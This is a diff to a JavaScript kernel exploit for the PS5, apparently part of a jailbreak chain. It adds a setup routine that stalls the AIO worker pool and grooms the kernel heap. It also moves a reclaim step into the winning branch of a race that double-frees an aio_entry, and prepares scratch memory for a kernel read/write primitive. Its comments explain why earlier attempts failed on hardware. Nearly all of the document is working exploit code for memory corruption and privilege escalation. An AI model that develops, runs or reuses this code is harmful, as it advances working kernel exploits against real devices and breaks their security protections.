@@ -48,8 +48,15 @@
  * elfldr above it are route-independent. Duplicating them would mean two copies
  * of the code that writes kernel memory, which is the last thing worth forking.
  *
- * NONE of this has run on hardware. The only stage with any console evidence is
- * double_free_reqs2, and that evidence is two failures.
+ * NONE of the stages after the race has run on hardware. double_free_reqs2 has
+ * three console runs behind it, all failures, each one a different bug:
+ *   1. a fresh thr_new per attempt gave the racer a ~0.4 ms head start, so the
+ *      delete always completed before the poll     -> parked racer + batched wake
+ *   2. every request carried the socket fd, so it had three references and
+ *      _fdrop() never fired (tcp_state stuck at 4) -> only reqs1[which] gets it
+ *   3. setup() was missing entirely, so the AIO worker pool was live and
+ *      completed the target request on its own     -> block + groom, see setup()
+ * Expect more of the same rather than a clean win.
  */
 "use strict";
 
@@ -62,12 +69,12 @@
 const SYS = {
     accept: 30, getsockname: 32, connect: 98, bind: 104, listen: 106,
     socket: 97, close: 6, setsockopt: 105, getsockopt: 118, thr_new: 455,
-    thr_exit: 431, read: 3, write: 4, pipe2: 687,
+    thr_exit: 431, read: 3, write: 4, pipe2: 687, socketpair: 135,
     aio_multi_delete: 0x296, aio_multi_wait: 0x297, aio_multi_poll: 0x298,
     aio_multi_cancel: 0x29a, aio_submit_cmd: 0x29d,
 };
 
-const AF_INET = 2, SOCK_STREAM = 1;
+const AF_INET = 2, SOCK_STREAM = 1, AF_UNIX = 1;
 const SOL_SOCKET = 0xffff, SO_REUSEADDR = 4, SO_LINGER = 0x80;
 const TCP_INFO = 0x20, IPPROTO_TCP = 6, TCP_INFO_SIZE = 0xec;
 // struct tcp_info's first byte is tcpi_state. 4 = TCPS_ESTABLISHED, i.e. the
@@ -82,6 +89,13 @@ const SIZEOF_AIO_RW_REQUEST = 0x28;
 const NUM_REQS = 3;
 const AIO_MAX_NUM = 0x80;
 const ATTEMPT_NUM = 0x80;
+/* The AIO subsystem runs a small pool of worker threads. WORKER_NUM of them is
+ * all it takes to stall the pool (see setup()), and SPRAY_NUM submissions is
+ * the heap groom that goes on top. Both values are the same in the PS4 and PS5
+ * references, so they are properties of the AIO implementation rather than of
+ * either console. */
+const WORKER_NUM = 2;
+const SPRAY_NUM = 0x200;
 
 const AIO_CMD_READ = 1, AIO_CMD_MULTI = 0x1000;
 const AIO_PRIORITY_HIGH = 3;
@@ -291,6 +305,54 @@ function verify_reqs2(buf) {
     return true;
 }
 
+/* --------------------------------------------------------------- setup */
+
+/* Stall the AIO worker pool, then groom the heap. Both references do this and
+ * I had omitted it entirely — which is why the race could never be won.
+ *
+ * WHY IT MATTERS. aio_submit_cmd queues work to a pool of kernel worker
+ * threads that complete requests in the background. Left running, they process
+ * the target request on their own schedule: by the time the racer's delete and
+ * our confirming delete arrive, the entry has already been completed and torn
+ * down by a worker, so one of the two deletes always finds nothing. That is
+ * exactly the shape of the last failure — every attempt reported
+ * errs=0x80020003/0x0, i.e. the racer's delete returned 0 and ours got ESRCH,
+ * with no variance across 128 attempts.
+ *
+ * The block is WORKER_NUM read requests aimed at the read end of a socketpair
+ * that nothing ever writes to. Each one parks a worker thread forever, so no
+ * request we submit afterwards is ever processed in the background and both
+ * deletes reach the entry in the state we left it.
+ *
+ * The spray afterwards is a heap groom: SPRAY_NUM submissions of NUM_REQS
+ * requests each, then cancel, so the 0x80 zone is already warm and the freed
+ * aio_entry is likely to be reclaimed by something we control. */
+function setup() {
+    const pair = alloc(8);
+    if (sc("socketpair", S(AF_UNIX), S(SOCK_STREAM), 0n, BigInt(pair)) !== 0)
+        throw new Error("lapse: socketpair(block) failed");
+    ST.block_ss = [rd32(pair, 0) | 0, rd32(pair, 4) | 0];
+
+    ST.spray_ids = BigInt(alloc(4 * SPRAY_NUM));
+    bzero(ST.spray_ids, 4 * SPRAY_NUM);
+
+    // block: WORKER_NUM reads on a socketpair that never receives anything
+    build_reqs1(WORKER_NUM, ST.block_ss[0]);
+    spray_aio(AIO_CMD_READ, WORKER_NUM, ST.spray_ids, 1);
+    ST.block_id = rd32(ST.spray_ids, 0);
+    if (ST.block_id === 0)
+        throw new Error("lapse: block submit produced no id — the AIO pool is "
+                        + "not stalled and the race cannot be won");
+    log("AIO blocked: block_ss=" + ST.block_ss.join("/")
+        + " block_id=" + hex(ST.block_id));
+
+    // groom
+    build_reqs1(NUM_REQS, -1);
+    spray_aio(AIO_CMD_READ, NUM_REQS, ST.spray_ids, SPRAY_NUM);
+    process_aio(AIO_OP_CANCEL, ST.spray_ids, 0, SPRAY_NUM);
+    log("AIO groom done (" + SPRAY_NUM + " submits)");
+}
+
 /* ------------------------------------------------------------- the race */
 
 function setupServer() {
@@ -422,6 +484,17 @@ function double_free_reqs2() {
             if (e0 === 0 && e1 === 0) {
                 log("attempt " + attempt + ": WON — poll=" + hex(pollErr)
                     + " tcp_state=" + tcpState + " errs=0/0 (double free)");
+                /* RECLAIM IMMEDIATELY, before the cleanup delete and before
+                 * closing the connection.
+                 *
+                 * From here until an rthdr lands in it, one chunk of the 0x80
+                 * zone is on the free list twice and ANY allocation in the
+                 * system can take it — at which point the next free corrupts
+                 * live kernel data. The reference calls find_rthdr_twins here
+                 * for exactly that reason; doing it from the caller (which is
+                 * what this did) leaves a delete and a close sitting inside the
+                 * window. */
+                find_rthdr_twins();
                 process_aio(AIO_OP_DELETE, idsAddr, 0, NUM_REQS);
                 sc("close", S(conn));
                 return { ids: idsAddr, which: which, attempt: attempt };
@@ -927,9 +1000,12 @@ function run() {
     try { sessionStorage.setItem("netctrl_dirty", "1"); } catch (e) {}
 
     init();
+    setup();
+    // double_free_reqs2 reclaims the freed chunk itself (find_rthdr_twins runs
+    // inside its win branch), so the twins already exist by the time it returns.
     const won = double_free_reqs2();
-    log("aio double free won on attempt " + won.attempt);
-    find_rthdr_twins();
+    log("aio double free won on attempt " + won.attempt
+        + ", rthdr twins " + ST.rthdr_twins.join("/"));
 
     leak_kaddrs();
     double_free_reqs1();
@@ -944,7 +1020,13 @@ function run() {
     N.ST.victim_pipe = ST.slave_pipe;
     N.ST.fdt_ofiles = ST.fdt_ofiles;
     N.ST.curproc = ST.curproc;
-    log("handoff curproc=" + hex(ST.curproc) + " fdt=" + hex(ST.fdt_ofiles));
+    /* KRW.scratch is normally allocated inside netctrl's OWN make_karw, which
+     * this path never runs. Without it every KRW.corrupt() would write the
+     * forged pipebuf to address 0 — silently, since the write goes through the
+     * pipe rather than faulting here. */
+    N.KRW.scratch = BigInt(alloc(0x100));
+    log("handoff curproc=" + hex(ST.curproc) + " fdt=" + hex(ST.fdt_ofiles)
+        + " scratch=" + hex(N.KRW.scratch));
 
     /* Cross-check the pipe KRW against the pktopts reader before anything
      * writes through it. They are independent primitives, so agreement on one
@@ -964,7 +1046,7 @@ function run() {
 }
 
 window.lapse_ps5 = {
-    run, init, double_free_reqs2, leak_kaddrs, double_free_reqs1, make_karw,
+    run, init, setup, double_free_reqs2, leak_kaddrs, double_free_reqs1, make_karw,
     find_rthdr_twins, make_pktopts_twins, build_reqs1, set_req_fd, spray_aio,
     process_aio, spawnDeleteRacer, verify_reqs2, build_rthdr, set_rthdr,
     get_rthdr, free_rthdr, ST, SYS, LAPSE_FIRMWARES,
